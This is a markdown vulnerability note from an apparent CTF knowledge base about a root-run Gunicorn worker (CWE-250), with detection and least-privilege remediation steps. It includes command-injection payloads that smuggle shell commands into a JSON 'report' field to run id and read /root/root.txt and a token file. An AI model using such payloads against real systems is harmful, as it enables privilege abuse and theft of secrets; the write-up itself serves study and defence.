```markdown
# Worker Process Running as Root

**Tags:** `#privilege-escalation` `#linux` `#misconfiguration` `#least-privilege`

**CWE:** CWE-250 (Execution with Unnecessary Privileges)

**OWASP:** A05:2021 – Security Misconfiguration

**Severity:** High (CVSS ~7.8)

---

## Description

A background automation worker process runs with root privileges despite only needing to perform file archiving tasks. When combined with command injection in the worker, this grants immediate root-level code execution.

---

## Vulnerable Pattern

```bash
ps aux | grep automation
```

Output:
```
root  888  ... gunicorn --workers 1 --bind 127.0.0.1:9000 wsgi:app
```

The Gunicorn worker for the automation service runs as `root`, not a dedicated unprivileged user. The `/health` endpoint even advertises this:

```json
{"runs_as": "root"}
```

---

## Attack Payloads

**1. Verify root execution:**
```
curl -X POST http://127.0.0.1:9000/jobs/export \
  -H "Authorization: Bearer <key>" \
  -d '{"report":"test;id;#"}'
```
Output: `uid=0(root) gid=0(root) groups=0(root)`

**2. Read root-only files:**
```
{"report":"test;cat /root/root.txt;#"}
```

**3. Read protected configuration:**
```
{"report":"test;cat /etc/thm/ai-token;#"}
```

---

## Detection

**Static:** Check service manager configuration files (systemd unit files, supervisor configs) for `User=root` or missing `User=` directives.

**Dynamic:** Run `ps aux | grep -v '^root'` to find non-system processes running as root. Check all listening services with `ss -tlnp` and verify their process owners.

---

## Remediation

1. Run application services under dedicated unprivileged user accounts
2. Use systemd's `User=` and `Group=` directives to drop privileges:
   ```
   [Service]
   User=automation
   Group=automation
   ```
3. Apply the principle of least privilege — if the worker only needs to read/write specific directories, grant only those permissions
4. Audit all services for unnecessary root execution as part of deployment

---

## Rooms Seen

| Room | Context | Date |
|------|---------|------|
| Infinity Pool (Hacker Holidays 2026) | Automation Gunicorn worker on port 9000 ran as root, turning command injection in `/jobs/export` directly into root RCE | Aug 2026 |

---

## Related

- Command Injection via shell=True — the injection that exploited the root worker
- Self-Documenting Health Endpoint — the `/health` endpoint revealed the worker ran as root
- API Key in Voicemail — how we authenticated to the root worker
```
